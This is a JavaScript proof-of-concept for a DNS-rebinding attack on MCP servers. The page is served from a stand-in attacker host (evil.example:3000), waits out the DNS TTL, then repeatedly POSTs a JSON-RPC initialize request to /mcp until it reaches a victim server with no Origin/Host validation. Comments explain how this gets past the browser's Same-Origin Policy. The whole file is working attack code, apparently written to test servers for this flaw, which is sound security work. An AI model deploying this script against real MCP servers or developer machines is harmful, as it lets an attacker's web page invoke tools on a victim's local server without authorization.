// DNS-rebind attack JS. Loaded from http://evil.example:3000 (resolved to
// attacker container on first lookup). Waits past the DNS TTL, then issues
// a fetch to /mcp which the browser will re-resolve — getting the victim
// container's IP this time.
//
// Browser considers the fetch same-origin because:
//   page origin       = http://evil.example:3000
//   fetch destination = http://evil.example:3000/mcp
// — same scheme, same host, same port. The DNS rebind hides the fact that
// "evil.example" resolves to a different machine post-flip.

(async function () {
  const log = document.getElementById('log');
  const result = document.getElementById('result');
  const origin = document.getElementById('origin');
  origin.textContent = window.location.origin;

  function appendLog(msg) {
    log.textContent += '\n' + msg;
  }

  function setResult(verdict, ok) {
    result.textContent = verdict;
    result.className = ok ? 'ok' : 'fail';
  }

  appendLog(`[t=0]   page loaded from ${window.location.origin}`);

  // Wait past the DNS TTL (1 second) before issuing the rebind fetch.
  // Some browsers cache for longer; the loop below retries every 2 seconds
  // for up to 30 seconds.
  const startTime = Date.now();
  const RETRY_INTERVAL_MS = 2000;
  const MAX_WAIT_MS = 30000;

  // Wait initial TTL window
  appendLog('[t=1s]  TTL expiry window; sleeping…');
  await new Promise(r => setTimeout(r, 1500));

  let attempt = 0;
  while (Date.now() - startTime < MAX_WAIT_MS) {
    attempt += 1;
    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    appendLog(`[t=${elapsed}s] attempt ${attempt}: POST http://evil.example:3000/mcp`);

    const initPayload = {
      jsonrpc: '2.0',
      id: attempt,
      method: 'initialize',
      params: {
        protocolVersion: '2025-06-18',
        capabilities: {},
        clientInfo: { name: 'dns-rebind-poc', version: '0' }
      }
    };

    try {
      const resp = await fetch(`${window.location.origin}/mcp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json, text/event-stream'
        },
        body: JSON.stringify(initPayload),
        // Important: don't use credentials. SOP would require CORS for
        // those; we want the simpler same-origin allowance.
      });

      const text = await resp.text();
      appendLog(`         status: ${resp.status}; body[0:120]: ${text.slice(0, 120)}`);

      // Try to parse the response as an MCP initialize response. The
      // response may be SSE-shaped (lines starting with `data:`); strip
      // those out.
      let parsed = null;
      for (const line of text.split('\n')) {
        const stripped = line.trim().replace(/^data:\s*/, '');
        if (!stripped) continue;
        try {
          const obj = JSON.parse(stripped);
          if (obj && obj.jsonrpc === '2.0' && obj.result && obj.result.protocolVersion) {
            parsed = obj;
            break;
          }
        } catch (e) { /* keep trying next line */ }
      }

      if (parsed) {
        appendLog(`[t=${elapsed}s] REBIND SUCCESS — MCP initialize response received`);
        appendLog(`         protocolVersion: ${parsed.result.protocolVersion}`);
        appendLog(`         serverInfo: ${JSON.stringify(parsed.result.serverInfo || {})}`);
        setResult(
          `VULNERABLE — attacker page from http://evil.example:3000 successfully invoked the MCP server. Page is from one origin (attacker), tool call landed on a different machine (victim) — DNS rebind defeated Same-Origin Policy because the server has no Origin/Host validation.`,
          true
        );
        document.title = 'PoC: VULNERABLE';
        return;
      }

      // Response wasn't an MCP initialize — that means we're still talking
      // to the attacker (pre-flip) or the server is rejecting us. Retry.
      appendLog('         not an MCP response yet; retrying after DNS re-cache window');
    } catch (e) {
      appendLog(`         fetch error: ${e.message}`);
    }

    await new Promise(r => setTimeout(r, RETRY_INTERVAL_MS));
  }

  appendLog('[t=30s+] giving up — rebind did not complete within 30 seconds');
  setResult(
    'INCONCLUSIVE — DNS rebind did not complete within the test window. ' +
    'Likely the browser is caching DNS more aggressively than expected, or ' +
    'the rebind DNS server is not configured. See logs.',
    false
  );
  document.title = 'PoC: INCONCLUSIVE';
})();
